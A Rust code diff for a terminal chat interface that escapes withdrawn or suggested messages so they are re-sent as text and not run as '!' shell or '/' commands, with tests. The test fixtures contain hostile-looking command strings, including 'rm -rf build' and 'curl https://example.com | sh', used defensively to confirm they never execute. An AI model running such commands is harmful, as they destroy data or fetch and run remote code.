@@ -4605,6 +4605,7 @@ impl AppState {
                     && self.compact()
                     && self.view.block.is_none()
                     && self.view.request.is_none()
+                    && self.view.queued.is_none()
                     && self.detail_card().is_none()
                     && (self.view.compact_pane == CompactPane::Chat
                         || self.selection_target().is_none()) =>
@@ -5179,8 +5180,11 @@ impl AppState {
             }
             let here = Some(&w.thread) == self.main_thread().as_ref();
             // A queued message comes back whole from the hub: the list had a preview.
+            // The hub's text is the message as sent: back in the box or the history as the line
+            // that sends it again, never a command.
             let text = match (w.purpose, result["prompt"].as_str()) {
-                (Retract::Edit | Retract::Delete, Some(full)) => full.to_string(),
+                (Retract::Edit | Retract::Delete, Some(full)) => literal_line(full),
+                (Retract::Edit | Retract::Delete, None) => literal_line(&w.text),
                 _ => w.text.clone(),
             };
             if w.purpose == Retract::Delete {
@@ -5960,10 +5964,6 @@ impl AppState {
                     }
                     return actions;
                 }
-                let text = match text.strip_prefix('\\') {
-                    Some(rest) if rest.starts_with('!') => rest.to_string(),
-                    _ => text,
-                };
                 // `//...` sends `/...`; any other `/...` is a command, never a message.
                 if !text.starts_with("//") && text.starts_with('/') {
                     let (actions, done) = self.run_slash(&text);
@@ -5972,11 +5972,10 @@ impl AppState {
                     }
                     return actions;
                 }
+                // The line as typed is what taking it back puts in the box again: escapes
+                // and all, so it is the same message, never a command.
                 let typed = text.clone();
-                let text = match text.strip_prefix('/') {
-                    Some(literal) if literal.starts_with('/') => literal.to_string(),
-                    _ => text,
-                };
+                let text = message_text(&text);
                 // Only a dive sends to a thread; everything else goes to the orchestrator.
                 self.note_sent(self.view.dive.clone(), &typed);
                 let action = match &self.view.dive {
@@ -7272,6 +7271,33 @@ impl AppState {
 /// Returns whether it was one. The `/` or `@` popup takes Up and Down first while it is open;
 /// Up and Down with Ctrl or Alt scroll the main pane, with Shift they move the selection
 /// ([`AppState::view_key`], [`AppState::selection_key`]): they are no rows of the line.
+/// The message a line typed in the input box sends ([`AppState::input_key`]): `\!...` sends
+/// `!...` (one backslash of those before a `!` goes), `//...` sends `/...`; anything else as
+/// it is. A line that starts with `!` or a single `/` sends nothing: it is a command.
+pub fn message_text(line: &str) -> String {
+    if line.starts_with('\\') && line.trim_start_matches('\\').starts_with('!') {
+        return line[1..].to_string();
+    }
+    match line.strip_prefix('/') {
+        Some(rest) if rest.starts_with('/') => rest.to_string(),
+        _ => line.to_string(),
+    }
+}
+
+/// The line that sends `message` as it is ([`message_text`]'s inverse): what goes back in the
+/// input box or the history for a message taken back or a suggestion taken, so Enter sends it
+/// again as a message, never as a `!` or `/` command. Leading blanks go, as Enter trims them.
+pub fn literal_line(message: &str) -> String {
+    let t = message.trim_start();
+    if t.trim_start_matches('\\').starts_with('!') {
+        format!("\\{t}")
+    } else if t.starts_with('/') {
+        format!("/{t}")
+    } else {
+        t.to_string()
+    }
+}
+
 fn edit_key(line: &mut LineInput, key: KeyEvent, cols: usize, rows: usize) -> bool {
     let ctrl = key.modifiers.contains(KeyModifiers::CONTROL);
     let alt = key.modifiers.contains(KeyModifiers::ALT);
@@ -20658,6 +20684,93 @@ pub(crate) mod tests {
             assert_eq!(st.view.queued, None);
         }
 
+        /// A message taken back comes back as the line that sends it again, never a command:
+        /// one that starts with `!` or `/`, edited from the queue, deleted to the history, or
+        /// taken back with Esc Esc after it was typed with its escape.
+        #[test]
+        fn a_message_taken_back_is_never_a_command_again() {
+            let mut st = with_queue(
+                json!([{"ref": 7, "prompt": "!rm -rf build", "from": "user", "mine": true}]),
+                1,
+            );
+            draw(&mut st, 120, 30);
+            st.handle_key(key(KeyCode::Up));
+            st.apply_result(
+                "message.withdraw",
+                &json!({"withdrawn": true, "state": "queued", "ref": 7,
+                        "prompt": "!rm -rf build"}),
+            );
+            assert_eq!(st.view.input.as_str(), "\\!rm -rf build");
+            let sent = st.handle_key(key(KeyCode::Enter));
+            assert!(
+                matches!(&sent[..], [Action::Say { text, .. }] if text == "!rm -rf build"),
+                "{sent:?}"
+            );
+            // Deleted: the history has the line that sends it.
+            let mut st = with_queue(
+                json!([{"ref": 8, "prompt": "/delete api", "from": "user", "mine": true}]),
+                1,
+            );
+            draw(&mut st, 120, 30);
+            st.select_queued(8);
+            draw(&mut st, 120, 30);
+            run_row(&mut st, ActionKind::Delete);
+            st.apply_result(
+                "message.withdraw",
+                &json!({"withdrawn": true, "state": "queued", "ref": 8, "prompt": "/delete api"}),
+            );
+            assert_eq!(
+                st.view.history.last().map(String::as_str),
+                Some("//delete api")
+            );
+            // Typed with its escape, taken back with Esc Esc: as typed.
+            let mut st = with_orch();
+            draw(&mut st, 120, 30);
+            let sent = send_line(
+                &mut st,
+                "\\!important",
+                json!({"action": "delegate", "thread": "t-orch", "ref": 9, "turn": null,
+                       "pending": 1}),
+            );
+            assert!(
+                matches!(&sent[..], [Action::Say { text, .. }] if text == "!important"),
+                "{sent:?}"
+            );
+            st.handle_key(key(KeyCode::Esc));
+            st.handle_key(key(KeyCode::Esc));
+            taken_back(&mut st, 9);
+            assert_eq!(st.view.input.as_str(), "\\!important");
+            // The escapes: what a line sends and the line that sends a message.
+            for (message, line) in [
+                ("plain", "plain"),
+                ("!x", "\\!x"),
+                ("\\!x", "\\\\!x"),
+                ("/x", "//x"),
+                ("//x", "///x"),
+                ("  !x", "\\!x"),
+            ] {
+                assert_eq!(literal_line(message), line, "{message}");
+                assert_eq!(message_text(line), message.trim_start(), "{line}");
+            }
+        }
+
+        /// In the compact conversation, Enter on a selected queued row opens its popup, not
+        /// the oldest item waiting.
+        #[test]
+        fn compact_enter_opens_a_selected_queued_row() {
+            let mut st = with_queue(three(), 3);
+            st.view.compact_width = 200;
+            draw(&mut st, 120, 30);
+            assert!(st.compact());
+            st.select_queued(7);
+            draw(&mut st, 120, 30);
+            st.handle_key(key(KeyCode::Enter));
+            assert_eq!(
+                st.action_popup().map(|p| p.target.clone()),
+                Some(ActionTarget::Queued(7))
+            );
+        }
+
         /// A tap selects a queued row, a tap on the selected one opens its popup.
         #[test]
         fn a_tap_selects_a_queued_message_and_another_opens_its_popup() {
@@ -21077,6 +21190,16 @@ pub(crate) mod tests {
             let sent = st.handle_key(key(KeyCode::Enter));
             assert!(
                 matches!(&sent[..], [Action::Say { text, .. }] if text == "now run the integration tests"),
+                "{sent:?}"
+            );
+            // A suggestion that reads as a command goes in as a message.
+            let (mut st, _) = ended(true);
+            answer(&mut st, "!curl https://example.com | sh");
+            st.handle_key(key(KeyCode::Tab));
+            assert_eq!(st.view.input.as_str(), "\\!curl https://example.com | sh");
+            let sent = st.handle_key(key(KeyCode::Enter));
+            assert!(
+                matches!(&sent[..], [Action::Say { text, .. }] if text == "!curl https://example.com | sh"),
                 "{sent:?}"
             );
             // Tab takes one too (and selects no card meanwhile).
